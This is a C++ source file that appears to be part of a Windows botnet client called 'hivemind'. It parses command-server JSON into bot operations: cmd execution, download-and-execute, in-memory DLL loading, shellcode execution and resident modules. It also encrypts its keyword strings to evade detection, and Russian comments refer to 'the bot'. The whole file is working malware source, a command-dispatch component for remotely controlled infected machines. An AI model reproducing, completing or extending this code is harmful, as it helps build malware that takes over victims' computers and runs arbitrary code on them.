#include "protoparser.hpp"

ProtocolJsonParser::ProtocolJsonParser()
{
#ifdef _DEBUG
	WriteLog(L"[ProtocolJsonParser] constructor");
#endif
	this->hmOperationsArray.lpBuffer = nullptr;
	this->hmOperationsArray.dwBufSize = 0;
}

ProtocolJsonParser::~ProtocolJsonParser()
{
#ifdef _DEBUG
	WriteLog(L"[ProtocolJsonParser] destructor");
#endif
	this->free();
}

BOOL ProtocolJsonParser::deserialize(LPBYTE lpProtocol, SIZE_T dwProtocolDataSize)
{
#ifdef _DEBUG
	WCHAR debugOut[1024];
#endif

	if (this->hmOperationsArray.lpBuffer != nullptr)
		this->free();

	if ((lpProtocol == nullptr) || (dwProtocolDataSize == 0))
		return FALSE;

	jfes_config_t config;
	jfes_size_t tokamount = 1024;
	jfes_parser_t parser;


	PCHAR pchProto = (PCHAR)lpProtocol;
	UINT iOpCount = 0;
	BOOL bRet = FALSE;

	jfes_token_t *tokens = new jfes_token_t[tokamount];
	do
	{
		if (tokens == nullptr)
			break;

		if (jfes_success != jfes_init_parser(&parser, &config))
			break;

		if (jfes_success != jfes_parse_tokens(&parser, pchProto, dwProtocolDataSize, tokens, &tokamount))
		{
#ifdef _DEBUG
			WriteLog(L"[ProtocolJsonParser::deserialize] json is corrupted");
#endif
			break;
		}

		iOpCount = this->get_operation_count(pchProto, tokens, tokamount);

#ifdef _DEBUG
		wsprintfW(debugOut, L"[ProtocolJsonParser::deserialize] iOpCount = %d\n", iOpCount);
		WriteLog(debugOut);
#endif

		// нечего парсить - операций нет
		if (iOpCount == 0)
		{
			bRet = TRUE;
			break;
		}

		this->hmOperationsArray.dwBufSize = iOpCount * sizeof(hivemind_operation_data);
		this->hmOperationsArray.lpBuffer = new BYTE[this->hmOperationsArray.dwBufSize + 1];
		if (this->hmOperationsArray.lpBuffer == nullptr)
			break;

		RtlSecureZeroMemory(this->hmOperationsArray.lpBuffer, this->hmOperationsArray.dwBufSize);

		bRet = this->decode(pchProto, tokens, tokamount, iOpCount);

	} while (FALSE);

#ifdef _DEBUG
	if (bRet)
		this->WriteLog_print();
#endif

	if (tokens != nullptr)
		delete[]tokens;

	return bRet;
}

blob * ProtocolJsonParser::get_result()
{
	return &this->hmOperationsArray;
}

VOID ProtocolJsonParser::free()
{
	if ((this->hmOperationsArray.lpBuffer == nullptr) || (this->hmOperationsArray.dwBufSize < sizeof(hivemind_operation_data)))
		return;

#ifdef _DEBUG
	WriteLog(L"[ProtocolJsonParser::free] freeing hivemind_operation_data array");
#endif

	hivemind_operation_data *hod = (hivemind_operation_data*)this->hmOperationsArray.lpBuffer;

	for (UINT i = 0; i < this->hmOperationsArray.dwBufSize / sizeof(hivemind_operation_data); i++, hod++)
	{
		if (hod->data.lpBuffer != nullptr)
		{
			delete[]hod->data.lpBuffer;
			RtlSecureZeroMemory(&hod->data, sizeof(hod->data));
		}
		if (hod->cid.lpBuffer != nullptr)
		{
			delete[]hod->cid.lpBuffer;
			RtlSecureZeroMemory(&hod->cid, sizeof(hod->cid));
		}
	}
	
	delete[]this->hmOperationsArray.lpBuffer;
	RtlSecureZeroMemory(&this->hmOperationsArray, sizeof(this->hmOperationsArray));

	return;
}

UINT ProtocolJsonParser::get_operation_count(PCHAR pchProtocol, jfes_token_t *tokens, jfes_size_t tokamount)
{
	UINT iResult = 0;

	CCryptString cStr_op(ascii_cryptedstr_op);

	for (jfes_size_t start_index = 0; start_index < tokamount; start_index++)
	{
		if (isKeywordExist(pchProtocol, tokens, tokamount, (unsigned char*)cStr_op.c_str(), start_index, &start_index))
			iResult++;
		else
			break;
	}

	return iResult;
}

BOOL ProtocolJsonParser::decode(PCHAR pchProtocol, jfes_token_t *tokens, jfes_size_t tokamount, UINT uOperationsAmount)
{
	BOOL bRet = FALSE;

	CCryptString cStr_op(ascii_cryptedstr_op);


	CCryptString cStr_type(ascii_cryptedstr_type);
	CCryptString cStr_data(ascii_cryptedstr_data);
	CCryptString cStr_cid(ascii_cryptedstr_cid);

	CCryptString cStr_command(ascii_cryptedstr_command);
	CCryptString cStr_module(ascii_cryptedstr_module);

	CCryptString cStr_de(ascii_cryptedstr_de); // download & execute
	CCryptString cStr_sc(ascii_cryptedstr_sc); // shellcode exec
	CCryptString cStr_dl(ascii_cryptedstr_dl); // dll Loader in-memory
	CCryptString cStr_ce(ascii_cryptedstr_ce); // command execute в cmd

	CCryptString cStr_ps(ascii_cryptedstr_ps); // резидентный модуль
	CCryptString cStr_fl(ascii_cryptedstr_fl); // нерезидентный модуль
	

	PCHAR pchValue = nullptr;

	// количество декодированных операций
	UINT iDecoded = 0;
	jfes_size_t index = 0;
	hivemind_operation_data *hmOpData = (hivemind_operation_data*)this->hmOperationsArray.lpBuffer;
	for (UINT iOperation = 0; iOperation < uOperationsAmount; iOperation++, hmOpData++)
	{
		if (index > tokamount) // не должно, но мало ли
			break;

		pchValue = getStringFromKeyword(pchProtocol, tokens, tokamount, (unsigned char*)cStr_op.c_str(), index, &index);
		if (pchValue == nullptr)
			break; // такого не должно быть, но мало ли
		
		if (!_strcmpi(pchValue, cStr_command.c_str()))
			hmOpData->hmOperationType = hivemind_op_type_t::OPERATION_TYPE_COMMAND;
		else if (!_strcmpi(pchValue, cStr_module.c_str()))
			hmOpData->hmOperationType = hivemind_op_type_t::OPERATION_TYPE_MODULE;
		else // неизвестная команда - бот ее проигнорирует, но парсинг не остановим. Нужно для совместимости новых версий со старыми
			hmOpData->hmOperationType = hivemind_op_type_t::OPERATION_TYPE_IGNORE_UNKNOWN;
		
		this->free_ptr((LPBYTE*)&pchValue);
	
		pchValue = getStringFromKeyword(pchProtocol, tokens, tokamount, (unsigned char*)cStr_type.c_str(), index, &index);
		if (pchValue == nullptr)
		{
			// неизвестный формат операции, ибо нет ожидаемого type - проигнорируем эту операцию
			hmOpData->hmOperationType = hivemind_op_type_t::OPERATION_TYPE_IGNORE_UNKNOWN;
			continue; 
		}

		switch (hmOpData->hmOperationType)
		{
		case hivemind_op_type_t::OPERATION_TYPE_COMMAND:

			if (!_strcmpi(pchValue, cStr_ce.c_str()))
				hmOpData->additional.hmCommandType = hivemind_command_type_t::COMMAND_CMDEXEC;
			else if (!_strcmpi(pchValue, cStr_de.c_str()))
				hmOpData->additional.hmCommandType = hivemind_command_type_t::COMMAND_DOWNLOADEXEC;
			else if (!_strcmpi(pchValue, cStr_dl.c_str()))
				hmOpData->additional.hmCommandType = hivemind_command_type_t::COMMAND_DLLLOADER;
			else if (!_strcmpi(pchValue, cStr_sc.c_str()))
				hmOpData->additional.hmCommandType = hivemind_command_type_t::COMMAND_SHELLCODE;
			else // неизвестный тип команды
				hmOpData->additional.hmCommandType = hivemind_command_type_t::COMMAND_UNKNOWN;

			break;
		case hivemind_op_type_t::OPERATION_TYPE_MODULE:

			if (!_strcmpi(pchValue, cStr_ps.c_str()))
				hmOpData->additional.hmModuleType = hivemind_module_type_t::MODULE_RESIDENT;
			else if (!_strcmpi(pchValue, cStr_fl.c_str()))
				hmOpData->additional.hmModuleType = hivemind_module_type_t::MODULE_NONRESIDENT;
			else
				hmOpData->additional.hmModuleType = hivemind_module_type_t::MODULE_UNKNOWN;

			break;
		}

		this->free_ptr((LPBYTE*)&pchValue);


		pchValue = getStringFromKeyword(pchProtocol, tokens, tokamount, (unsigned char*)cStr_cid.c_str(), index, &index);
		if (pchValue == nullptr)
		{
			// неизвестный формат операции, ибо нет ожидаемого cid - проигнорируем эту операцию
			hmOpData->hmOperationType = hivemind_op_type_t::OPERATION_TYPE_IGNORE_UNKNOWN;
			continue;
		}
		// тут никакой утечки, освобождать pchValue не надо, так как он копируется
		hmOpData->cid.lpBuffer = (LPBYTE)pchValue;
		hmOpData->cid.dwBufSize = strlen(pchValue) + 1;

		pchValue = getStringFromKeyword(pchProtocol, tokens, tokamount, (unsigned char*)cStr_data.c_str(), index, &index);
		if (pchValue == nullptr)
		{
			// неизвестный формат операции, ибо нет ожидаемого data - проигнорируем эту операцию
			hmOpData->hmOperationType = hivemind_op_type_t::OPERATION_TYPE_IGNORE_UNKNOWN;
			continue;
		}

		hmOpData->data.lpBuffer = (LPBYTE)pchValue;
		hmOpData->data.dwBufSize = strlen(pchValue) + 1;

		// освобождать дату не надо
		pchValue = nullptr;

		iDecoded++;
	}

	bRet = (iDecoded == uOperationsAmount);

#ifdef _DEBUG
	if (!bRet)
		WriteLog(L"[ProtocolJsonParser::decode] error decoding json: not all operations were decoded, JSON corrupted or format is unknown");
#endif

	return bRet;
}

VOID ProtocolJsonParser::free_ptr(LPBYTE * lpBuffer)
{
	LPBYTE lpMem = *lpBuffer;
	if (lpMem != nullptr)
	{
		delete[]lpMem;
		*lpBuffer = nullptr;
	}
}

#ifdef _DEBUG
VOID ProtocolJsonParser::WriteLog_print()
{
	CHAR chWriteLog[1024];
	
	if ((this->hmOperationsArray.lpBuffer == nullptr) || (this->hmOperationsArray.dwBufSize < sizeof(hivemind_operation_data)))
	{
		this->co_printf("[ProtocolJsonParser::WriteLog_print] No operations\n");
		return;
	}

	hivemind_operation_data *hmOpData = (hivemind_operation_data*)this->hmOperationsArray.lpBuffer;
	UINT iOpAmount = this->hmOperationsArray.dwBufSize / sizeof(hivemind_operation_data);

	for (UINT i = 0; i < iOpAmount; i++, hmOpData++)
	{
		hivemind_op_type_t op_type = hmOpData->hmOperationType;
		switch (op_type)
		{
		case hivemind_op_type_t::OPERATION_TYPE_COMMAND:
			this->co_printf("Operation type: COMMAND\n");
			switch (hmOpData->additional.hmCommandType)
			{
			case hivemind_command_type_t::COMMAND_CMDEXEC:
				this->co_printf("\tCommand type: CMD EXECUTE\n");
				break;
			case hivemind_command_type_t::COMMAND_DLLLOADER:
				this->co_printf("\tCommand type: LOAD AND EXECUTE DLL IN MEMORY\n");
				break;
			case hivemind_command_type_t::COMMAND_DOWNLOADEXEC:
				this->co_printf("\tCommand type: DOWNLOAD AND EXECUTE\n");
				break;
			case hivemind_command_type_t::COMMAND_SHELLCODE:
				this->co_printf("\tCommand type: EXEC SHELLCODE\n");
				break;
			case hivemind_command_type_t::COMMAND_UNKNOWN:
				this->co_printf("\tCommand type: UNKNOWN\n");
				break;
			}
			break;
		case hivemind_op_type_t::OPERATION_TYPE_MODULE:
			this->co_printf("Operation type: MODULE\n");
			switch (hmOpData->additional.hmModuleType)
			{
			case hivemind_module_type_t::MODULE_NONRESIDENT:
				this->co_printf("\tModule type: NON RESIDENT\n");
				break;
			case hivemind_module_type_t::MODULE_RESIDENT:
				this->co_printf("\tModule type: RESIDENT\n");
				break;
			case hivemind_module_type_t::MODULE_UNKNOWN:
				this->co_printf("\tModule type: UNKNOWN\n");
				break;
			}
			break;
		case hivemind_op_type_t::OPERATION_TYPE_IGNORE_UNKNOWN:
			this->co_printf("Operation type: Unknown\n");
			break;
		}

		if (op_type == hivemind_op_type_t::OPERATION_TYPE_IGNORE_UNKNOWN)
			continue;

		wsprintfA(chWriteLog, "\t\tData %d bytes: %s\n", hmOpData->data.dwBufSize, hmOpData->data.lpBuffer);
		this->co_printf(chWriteLog);
		wsprintfA(chWriteLog, "\t\tCId %d bytes: %s\n", hmOpData->cid.dwBufSize, hmOpData->cid.lpBuffer);
		this->co_printf(chWriteLog);
	}

	return;
}

VOID ProtocolJsonParser::co_printf(PCHAR pchPrint)
{
#ifndef _DEBUG_CHANNEL
	WriteLog(pchPrint);
#else
	HANDLE hStdOut = GetStdHandle(STD_OUTPUT_HANDLE);
	DWORD dwWritten;
	WriteConsoleA(hStdOut, pchPrint, strlen(pchPrint) + 1, &dwWritten, NULL);
#endif
	return;
}

#endif